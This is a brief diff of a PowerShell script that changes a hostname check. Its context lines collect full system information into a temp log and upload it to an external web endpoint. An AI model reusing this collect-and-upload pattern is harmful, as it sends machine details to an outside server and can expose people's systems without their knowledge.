@@ -3,7 +3,7 @@ Get-ComputerInfo > "$env:temp\$env:computername.log"
 (New-Object System.Net.WebClient).UploadFile('https://www.mistrelci.com.ar/Script/upload.php', $env:temp + '\'+ $env:computername + '.log')
 
 #For this PC
-if ($env:computername -eq 'NOTEBOOK') {
+if ($env:computername -eq 'GAMER') {
 #For GAMER PC
 
 }
